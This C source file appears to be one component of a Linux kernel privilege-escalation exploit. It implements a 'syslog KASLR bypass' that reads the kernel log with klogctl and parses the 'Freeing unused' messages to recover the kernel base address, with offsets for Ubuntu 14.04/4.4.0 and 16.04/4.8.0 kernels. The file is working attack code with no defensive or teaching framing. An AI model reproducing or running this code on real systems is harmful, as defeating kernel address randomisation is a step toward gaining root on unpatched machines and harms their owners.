#include "./kernel_infos.h"

// * * * * * * * * * * * * * * syslog KASLR bypass * * * * * * * * * * * * * *

#define SYSLOG_ACTION_READ_ALL 3
#define SYSLOG_ACTION_SIZE_BUFFER 10

/* We don't have permission to do klogctl in Docker. */
void mmap_syslog(char** buffer, int* size) {
	*size = klogctl(SYSLOG_ACTION_SIZE_BUFFER, 0, 0);
	if (*size == -1) {
		perror("[-] klogctl(SYSLOG_ACTION_SIZE_BUFFER)");
		exit(EXIT_FAILURE);
	}

	*size = (*size / getpagesize() + 1) * getpagesize();
	*buffer = (char*)mmap(NULL, *size, PROT_READ | PROT_WRITE,
				   MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);

	*size = klogctl(SYSLOG_ACTION_READ_ALL, &((*buffer)[0]), *size);
	if (*size == -1) {
		perror("[-] klogctl(SYSLOG_ACTION_READ_ALL)");
		exit(EXIT_FAILURE);
	}
}

unsigned long get_kernel_addr_trusty(char* buffer, int size) {
	const char* needle1 = "Freeing unused";
	char* substr = (char*)memmem(&buffer[0], size, needle1, strlen(needle1));
	if (substr == NULL) {
		fprintf(stderr, "[-] substring '%s' not found in syslog\n", needle1);
		exit(EXIT_FAILURE);
	}

	int start = 0;
	int end = 0;
	for (end = start; substr[end] != '-'; end++);

	const char* needle2 = "ffffff";
	substr = (char*)memmem(&substr[start], end - start, needle2, strlen(needle2));
	if (substr == NULL) {
		fprintf(stderr, "[-] substring '%s' not found in syslog\n", needle2);
		exit(EXIT_FAILURE);
	}

	char* endptr = &substr[16];
	unsigned long r = strtoul(&substr[0], &endptr, 16);

	r &= 0xffffffffff000000ul;

	return r;
}

unsigned long get_kernel_addr_xenial(char* buffer, int size) {
	const char* needle1 = "Freeing unused";
	char* substr = (char*)memmem(&buffer[0], size, needle1, strlen(needle1));
	if (substr == NULL) {
		fprintf(stderr, "[-] substring '%s' not found in syslog\n", needle1);
		exit(EXIT_FAILURE);
	}

	int start = 0;
	int end = 0;
	for (start = 0; substr[start] != '-'; start++);
	for (end = start; substr[end] != '\n'; end++);

	const char* needle2 = "ffffff";
	substr = (char*)memmem(&substr[start], end - start, needle2, strlen(needle2));
	if (substr == NULL) {
		fprintf(stderr, "[-] substring '%s' not found in syslog\n", needle2);
		exit(EXIT_FAILURE);
	}

	char* endptr = &substr[16];
	unsigned long r = strtoul(&substr[0], &endptr, 16);

	r &= 0xfffffffffff00000ul;
	r -= 0x1000000ul;

	return r;
}

unsigned long get_kernel_addr(int kernel) {
	char* syslog;
	int size;
	mmap_syslog(&syslog, &size);

	if (strcmp("14.04", kernels[kernel].distro) == 0 &&
	    strncmp("4.4.0", kernels[kernel].version, 5) == 0)
		return get_kernel_addr_trusty(syslog, size);
	if (strcmp("16.04", kernels[kernel].distro) == 0 &&
	    strncmp("4.8.0", kernels[kernel].version, 5) == 0)
		return get_kernel_addr_xenial(syslog, size);

	printf("[-] KASLR bypass only tested on trusty 4.4.0-* and xenial 4-8-0-*");
	exit(EXIT_FAILURE);
}